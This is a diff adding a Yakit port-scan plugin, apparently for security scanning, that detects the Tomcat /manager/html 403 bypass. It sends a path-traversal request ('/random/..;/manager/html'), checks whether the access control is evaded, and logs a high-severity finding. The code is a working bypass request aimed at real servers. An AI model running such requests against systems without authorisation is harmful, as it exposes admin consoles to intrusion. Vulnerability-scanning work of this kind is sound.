@@ -1,0 +1,143 @@
+# port scan plugin
+yakit.AutoInitYakit()
+
+/*
+本插件定义的函数主要用于端口扫描的额外扩展
+
+函数定义如下：
+func(result *fp.MatchResult)
+
+// 详细结构体定义与内容见模版结尾
+// 这里最关键的是，如果对扫描出的结果有疑问，需要对 MatchResult 进行修改，应该直接
+// 对变量.Field 进行修改。
+
+DEMO:
+
+handle = func(result) {
+    if result.Fingerprint != nil {
+        if result.Port == 80 && result.GetServiceName() == "" {
+            result.Fingerprint.ServiceName = "http"
+        }
+    }
+}
+
+*/
+
+handle403Tomcat = func(host, port) {
+    addr = str.HostPort(host, port)
+    isTls = str.IsTLSServer(addr)
+
+    met403 = false
+    // https://0xdf.gitlab.io/2021/12/29/htb-logforge.html
+    rsp, req, _ = poc.HTTP(`GET /manager/html HTTP/1.1
+Host: {{params(target)}}
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+`, poc.params({
+    "target": addr,
+}), poc.https(isTls))
+    if len(rsp) > 0 {
+        rspIns = poc.ParseBytesToHTTPResponse(rsp)[0]
+        if rspIns != nil {
+            if rspIns.StatusCode == 403 {
+                met403 = true
+            }
+        }
+    }
+
+    if !met403 {
+        return
+    }
+
+    yakit.Info("Found 403 for /manager/html in %v", addr)
+
+    bypassed = false
+    rsp, req, _ = poc.HTTP(`GET /{{rs}}/..;/manager/html HTTP/1.1
+Host: {{params(target)}}
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+`, poc.params({
+    "target": addr,
+}), poc.https(isTls))
+    if len(rsp) > 0 {
+        rspIns = poc.ParseBytesToHTTPResponse(rsp)[0]
+        if rspIns != nil {
+            if rspIns.StatusCode != 403 && rspIns.StatusCode != 404 {
+                bypassed = true
+            }
+        }
+    }
+
+    if !bypassed {
+        return
+    }
+
+    if !str.MatchAllOfRegexp(rsp, `<h1>401 Unauthorized`, `WWW-Authenticate:\s+Basic`, `tomcat-users\.xml`) {
+        return
+    }
+
+    yakit.Info("%v /manager/html Bypassed!", addr)
+    risk.NewRisk(
+        addr, risk.severity("high"), 
+        risk.title(sprintf("Tomcat /manager/html 403 Bypass: %v", addr)),
+        risk.titleVerbose(sprintf("Tomcat /manager/html 403 绕过: %v", addr)),
+        risk.type("info-leak[tomcat]"),
+        risk.typeVerbose("Tomcat后台泄漏"),
+        risk.payload(addr + "/random/..;/manager/html"),
+    )
+}
+
+handle = func(result /* *fp.MatchResult */) {
+    // handle match result
+    if !result.IsOpen() {
+        return
+    }
+
+    if len(result.Fingerprint.HttpFlows) <= 0  {
+        return
+    }
+
+    handle403Tomcat(result.Target, result.Port)
+}
+
+/*
+// 具体定义如下：
+type palm/common/fp.(MatchResult) struct {
+      Target: string  
+      Port: int  
+      State: fp.PortState  
+      Reason: string  
+      Fingerprint: *fp.FingerprintInfo  
+  StructMethods(结构方法/函数): 
+  PtrStructMethods(指针结构方法/函数): 
+      func GetBanner() return(string) 
+      func GetCPEs() return([]string) 
+      func GetDomains() return([]string) 
+      func GetHtmlTitle() return(string) 
+      func GetProto() return(fp.TransportProto) 
+      func GetServiceName() return(string) 
+      func IsOpen() return(bool) 
+      func String() return(string) 
+}
+
+
+type palm/common/fp.(FingerprintInfo) struct {
+      IP: string  
+      Port: int  
+      Proto: fp.TransportProto  
+      ServiceName: string  
+      ProductVerbose: string  
+      Info: string  
+      Version: string  
+      Hostname: string  
+      OperationVerbose: string  
+      DeviceType: string  
+      CPEs: []string  
+      Raw: string  
+      Banner: string  
+      CPEFromUrls: map[string][]*webfingerprint.CPE  
+      HttpFlows: []*fp.HTTPFlow  
+  StructMethods(结构方法/函数): 
+  PtrStructMethods(指针结构方法/函数): 
+      func FromRegexp2Match(v1: *regexp2.Match) 
+}
+*/
+
